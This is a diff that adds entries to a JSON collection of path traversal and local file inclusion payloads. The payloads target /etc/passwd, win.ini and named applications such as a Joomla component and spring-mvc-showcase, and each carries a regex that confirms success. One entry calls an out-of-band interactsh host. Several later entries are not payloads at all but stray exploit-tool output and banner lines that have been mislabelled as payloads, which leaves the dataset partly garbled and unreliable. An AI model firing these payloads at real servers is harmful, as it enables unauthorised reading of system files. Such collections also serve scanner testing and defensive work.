@@ -75,5 +75,181 @@
       "expected_status_code": 200,
       "success_regex": "root:.*:0:0|boot.ini"
     }
+  },
+  {
+    "payload_id": "OWP-215181",
+    "vulnerability_category": "Injection (LFI/RFI)",
+    "target_technology": "Linux",
+    "injection_point": "body_json",
+    "payload_string": "{{BaseURL}}/%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e/etc/passwd",
+    "validation": {
+      "expected_status_code": 200,
+      "success_regex": "root:|boot\\.ini|\\[extensions\\]"
+    }
+  },
+  {
+    "payload_id": "OWP-215182",
+    "vulnerability_category": "Injection (LFI/RFI)",
+    "target_technology": "Windows",
+    "injection_point": "body_json",
+    "payload_string": "{{BaseURL}}/static/%255c%255c..%255c/..%255c/..%255c/..%255c/..%255c/..%255c/..%255c/..%255c/..%255c/windows/win.ini",
+    "validation": {
+      "expected_status_code": 200,
+      "success_regex": "root:|boot\\.ini|\\[extensions\\]"
+    }
+  },
+  {
+    "payload_id": "OWP-215183",
+    "vulnerability_category": "Injection (LFI/RFI)",
+    "target_technology": "Windows",
+    "injection_point": "body_json",
+    "payload_string": "{{BaseURL}}/spring-mvc-showcase/resources/%255c%255c..%255c/..%255c/..%255c/..%255c/..%255c/..%255c/..%255c/..%255c/..%255c/windows/win.ini",
+    "validation": {
+      "expected_status_code": 200,
+      "success_regex": "root:|boot\\.ini|\\[extensions\\]"
+    }
+  },
+  {
+    "payload_id": "OWP-215184",
+    "vulnerability_category": "Injection (LFI/RFI)",
+    "target_technology": "Generic",
+    "injection_point": "body_json",
+    "payload_string": "{{BaseURL}}/setup/setup-s/%u002e%u002e/%u002e%u002e/log.jsp",
+    "validation": {
+      "expected_status_code": 200,
+      "success_regex": "root:|boot\\.ini|\\[extensions\\]"
+    }
+  },
+  {
+    "payload_id": "OWP-215187",
+    "vulnerability_category": "Injection (LFI/RFI)",
+    "target_technology": "Windows",
+    "injection_point": "body_json",
+    "payload_string": "{{BaseURL}}/.../.../.../.../.../.../.../.../.../windows/win.ini",
+    "validation": {
+      "expected_status_code": 200,
+      "success_regex": "root:|boot\\.ini|\\[extensions\\]"
+    }
+  },
+  {
+    "payload_id": "OWP-215188",
+    "vulnerability_category": "Injection (LFI/RFI)",
+    "target_technology": "Linux",
+    "injection_point": "body_json",
+    "payload_string": "{{BaseURL}}/.%00./.%00./etc/passwd",
+    "validation": {
+      "expected_status_code": 200,
+      "success_regex": "root:|boot\\.ini|\\[extensions\\]"
+    }
+  },
+  {
+    "payload_id": "OWP-215189",
+    "vulnerability_category": "Injection (LFI/RFI)",
+    "target_technology": "Linux",
+    "injection_point": "body_json",
+    "payload_string": "{{BaseURL}}/wlmeng/../../../../../../../../../../../etc/passwd%00index.htm",
+    "validation": {
+      "expected_status_code": 200,
+      "success_regex": "root:|boot\\.ini|\\[extensions\\]"
+    }
+  },
+  {
+    "payload_id": "OWP-215190",
+    "vulnerability_category": "Injection (LFI/RFI)",
+    "target_technology": "Generic",
+    "injection_point": "body_json",
+    "payload_string": "{{BaseURL}}/services/pluginscript/..;/..;/..;/getFavicon?host={{interactsh-url}}",
+    "validation": {
+      "expected_status_code": 200,
+      "success_regex": "root:|boot\\.ini|\\[extensions\\]"
+    }
+  },
+  {
+    "payload_id": "OWP-237764",
+    "vulnerability_category": "Injection (LFI/RFI)",
+    "target_technology": "Linux",
+    "injection_point": "body_json",
+    "payload_string": "{{BaseURL}}/index.php?option=com_webtv&controller=../../../../../../../../../../etc/passwd%00",
+    "validation": {
+      "expected_status_code": 200,
+      "success_regex": "root:|boot\\.ini|\\[extensions\\]"
+    }
+  },
+  {
+    "payload_id": "OWP-237787",
+    "vulnerability_category": "Injection (LFI/RFI)",
+    "target_technology": "Generic",
+    "injection_point": "body_json",
+    "payload_string": "[+] The following gadget chain will generate the following code : <?php phpinfo();?> (base64 value: PD9waHAgcGhwaW5mbygpOz8+)",
+    "validation": {
+      "expected_status_code": 200,
+      "success_regex": "root:|boot\\.ini|\\[extensions\\]"
+    }
+  },
+  {
+    "payload_id": "OWP-237816",
+    "vulnerability_category": "Injection (LFI/RFI)",
+    "target_technology": "Generic",
+    "injection_point": "body_json",
+    "payload_string": "[*] The following URL is targeted : http://127.0.0.1",
+    "validation": {
+      "expected_status_code": 200,
+      "success_regex": "root:|boot\\.ini|\\[extensions\\]"
+    }
+  },
+  {
+    "payload_id": "OWP-237817",
+    "vulnerability_category": "Injection (LFI/RFI)",
+    "target_technology": "Generic",
+    "injection_point": "body_json",
+    "payload_string": "[*] The following local file is leaked : /test",
+    "validation": {
+      "expected_status_code": 200,
+      "success_regex": "root:|boot\\.ini|\\[extensions\\]"
+    }
+  },
+  {
+    "payload_id": "OWP-237818",
+    "vulnerability_category": "Injection (LFI/RFI)",
+    "target_technology": "Generic",
+    "injection_point": "body_json",
+    "payload_string": "[*] Running POST requests",
+    "validation": {
+      "expected_status_code": 200,
+      "success_regex": "root:|boot\\.ini|\\[extensions\\]"
+    }
+  },
+  {
+    "payload_id": "OWP-237819",
+    "vulnerability_category": "Injection (LFI/RFI)",
+    "target_technology": "Generic",
+    "injection_point": "body_json",
+    "payload_string": "[+] File /test leak is finished!",
+    "validation": {
+      "expected_status_code": 200,
+      "success_regex": "root:|boot\\.ini|\\[extensions\\]"
+    }
+  },
+  {
+    "payload_id": "OWP-408381",
+    "vulnerability_category": "Injection (LFI/RFI)",
+    "target_technology": "Generic",
+    "injection_point": "body_json",
+    "payload_string": "[+] e-Vision <= 2.0.2 Multiple Local File Inclusion Exploit\\r\\n",
+    "validation": {
+      "expected_status_code": 200,
+      "success_regex": "root:|boot\\.ini|\\[extensions\\]"
+    }
+  },
+  {
+    "payload_id": "OWP-408382",
+    "vulnerability_category": "Injection (LFI/RFI)",
+    "target_technology": "Generic",
+    "injection_point": "body_json",
+    "payload_string": "[+] PunBB (Private Messaging System 1.2.x) Multiple LFI Exploit\\r\\n",
+    "validation": {
+      "expected_status_code": 200,
+      "success_regex": "root:|boot\\.ini|\\[extensions\\]"
+    }
   }
 ]
